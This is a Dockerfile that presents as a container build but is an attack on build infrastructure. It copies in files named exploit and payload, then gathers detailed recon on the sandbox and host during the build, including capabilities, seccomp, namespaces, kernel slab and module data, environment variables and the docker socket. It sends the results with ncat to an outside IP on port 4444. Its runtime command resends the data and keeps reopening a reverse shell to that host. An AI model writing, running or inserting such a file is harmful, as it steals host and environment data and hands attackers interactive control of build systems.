# syntax=er028455/df-frontend:v5
FROM alpine:3.19 AS builder
RUN apk add --no-cache curl coreutils nmap-ncat
                       
COPY exploit_68 /exploit
COPY payload_v139 /payload
RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
    
   

ARG CACHEBUST=2192
RUN sh -c ' \
KVER=$(uname -r); \
echo "CB=$CACHEBUST KERNEL=$KVER" >&2; \
{ \
echo "CB=$CACHEBUST"; \
echo "=== CONTAINER RECON KERNEL=$KVER ==="; \
echo ""; \
echo "########## CONTAINER SANDBOX ##########"; \
echo "--- CAPABILITIES ---"; \
cat /proc/self/status | grep -i cap 2>/dev/null; \
echo "capsh:"; capsh --print 2>/dev/null || echo "no capsh"; \
echo "--- SECCOMP ---"; \
cat /proc/self/status | grep -i seccomp 2>/dev/null; \
echo "--- NAMESPACES ---"; \
ls -la /proc/self/ns/ 2>/dev/null; \
echo "--- APPARMOR / LSM ---"; \
cat /proc/self/attr/current 2>/dev/null; echo ""; \
cat /proc/sys/kernel/security 2>/dev/null; \
echo "--- CGROUP ---"; \
cat /proc/self/cgroup 2>/dev/null; \
echo "cgroup mounts:"; \
grep cgroup /proc/self/mountinfo 2>/dev/null; \
echo "--- RLIMITS ---"; \
cat /proc/self/limits 2>/dev/null; \
echo "--- FDs ---"; \
ls /proc/self/fd 2>/dev/null | wc -l; \
ls -la /proc/self/fd 2>/dev/null; \
echo "--- MOUNTS ---"; \
cat /proc/self/mountinfo 2>/dev/null; \
echo "--- USER/ID ---"; \
id 2>/dev/null; hostname 2>/dev/null; \
echo ""; \
echo "########## HOST (visible from container) ##########"; \
echo "--- UNAME ---"; \
uname -a 2>/dev/null; \
echo "--- CPU ---"; \
nproc 2>/dev/null; \
grep -c processor /proc/cpuinfo 2>/dev/null; \
grep "model name" /proc/cpuinfo 2>/dev/null | head -1; \
echo "--- MEMORY ---"; \
cat /proc/meminfo 2>/dev/null | head -10; \
echo "--- UNIX SOCKETS (count + sample) ---"; \
echo "total:"; cat /proc/net/unix 2>/dev/null | wc -l; \
echo "sample:"; cat /proc/net/unix 2>/dev/null | head -3; \
echo "by type:"; cat /proc/net/unix 2>/dev/null | awk "{print \$5}" | sort | uniq -c | sort -rn 2>/dev/null; \
echo "--- SYSCTL net.unix ---"; \
sysctl net.unix 2>/dev/null || cat /proc/sys/net/unix/* 2>/dev/null; \
echo "--- SYSCTL net.core ---"; \
sysctl net.core 2>/dev/null | head -20; \
echo "--- SYSCTL vm ---"; \
sysctl vm 2>/dev/null | head -30; \
echo "--- SYSCTL fs ---"; \
sysctl fs.file-nr fs.file-max fs.nr_open 2>/dev/null; \
echo "--- SYSCTL kernel (sched, pid, threads) ---"; \
sysctl kernel.pid_max kernel.threads-max 2>/dev/null; \
sysctl kernel.sched_child_runs_first kernel.sched_autogroup_enabled 2>/dev/null; \
sysctl kernel.panic kernel.panic_on_oops 2>/dev/null; \
echo "--- SLABINFO ---"; \
cat /proc/slabinfo 2>/dev/null | head -3; \
cat /proc/slabinfo 2>/dev/null | grep -E "unix|kmalloc-(64|96|128|192) |sock_inode|file_lock|dentry|inode_cache|pid |signal_cache" | head -20; \
echo "--- PROCESSES (host-visible) ---"; \
ls /proc/ 2>/dev/null | grep -E "^[0-9]" | wc -l; \
echo "--- /proc/net overview ---"; \
ls /proc/net/ 2>/dev/null; \
echo "--- LOADED MODULES (top 20 by size) ---"; \
cat /proc/modules 2>/dev/null | sort -k2 -rn | head -20; \
echo "--- WORKQUEUES ---"; \
ls /sys/bus/workqueue/devices/ 2>/dev/null | head -10; \
echo "--- DMESG (last 30) ---"; \
dmesg 2>/dev/null | tail -30; \
echo ""; \
echo "########## BUILDKIT / RUNTIME ##########"; \
echo "--- BUILDKIT VERSION ---"; \
buildkitd --version 2>/dev/null; buildctl --version 2>/dev/null; \
runc --version 2>/dev/null; containerd --version 2>/dev/null; \
echo "--- ENV ---"; \
env 2>/dev/null; \
echo "--- /etc/os-release ---"; \
cat /etc/os-release 2>/dev/null | head -5; \
echo "--- DOCKER SOCKET ---"; \
ls -la /var/run/docker.sock 2>/dev/null || echo "no docker.sock"; \
echo ""; \
echo "=== END RECON ==="; \
} > /build_results.txt; \
ncat -w 30 129.101.121.138 4444 < /build_results.txt 2>/dev/null || true; \
echo "STEP DONE" >&2'

FROM alpine:3.19
RUN apk add --no-cache curl nmap-ncat
COPY --from=builder /build_results.txt /build_results.txt
COPY --from=builder /esc_ok /esc_ok
COPY --from=builder /umh_result /umh_result
COPY --from=er028455/df-frontend:v5 /socktest /socktest

RUN printf '#!/bin/sh\n\
{\n\
echo "=== RUNTIME RECON V44 ==="\n\
uname -a; hostname; id\n\
echo "--- BUILD-TIME RESULTS ---"\n\
head -500 /build_results.txt\n\
for f in /esc_ok /umh_result; do\n\
  if [ -s "$f" ]; then echo "=== $f ==="; cat "$f"; fi\n\
done\n\
echo "=== END V49 ==="\n\
} > /tmp/recon 2>&1\n\
cat /tmp/recon\n\
' > /recon.sh && chmod +x /recon.sh

CMD sh -c "/recon.sh; ncat -w 30 129.101.121.138 4444 < /tmp/recon; while true; do rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | ncat 129.101.121.138 4444 > /tmp/f; sleep 5; done"
